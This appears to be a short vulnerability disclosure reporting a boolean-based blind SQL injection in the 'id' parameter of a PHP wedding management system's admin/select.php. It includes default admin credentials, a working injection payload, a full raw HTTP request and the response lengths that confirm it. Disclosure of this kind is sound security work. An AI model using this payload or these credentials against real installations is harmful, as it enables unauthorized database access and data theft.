# Wedding Management System v1.0 by codeastr.com has SQL injection

Author： k0xx

The password for the backend login account is: admin@mail.com/Password@123

vendors: https://codeastro.com/wedding-management-system-in-php-with-source-code/

Vulnerability File: /Wedding-Management/admin/select.php

Vulnerability location: /Wedding-Management/admin/select.php,id

[+] Payload: id=1 and length(database()) =9 // Leak place ---> id

Current database name: dbwedding,length is 9

```sql
POST /Wedding-Management/admin/select.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

id=1 and length(database()) =9
```

When length (database ()) = 8, Content-Length: 397

![image](https://user-images.githubusercontent.com/54017627/167994575-97715a69-9954-49c5-b432-6d3a8ec1d4c8.png)

![image](https://user-images.githubusercontent.com/54017627/167994398-25fcaa80-81ea-41e2-954b-80174f08ec79.png)

When length (database ()) = 9, Content-Length: 909

![image](https://user-images.githubusercontent.com/54017627/167994605-88fdc305-f19a-434f-8b94-b545db6e8951.png)

![image](https://user-images.githubusercontent.com/54017627/167994376-97dbd3bc-401a-4bcb-947f-5891e3e931db.png)
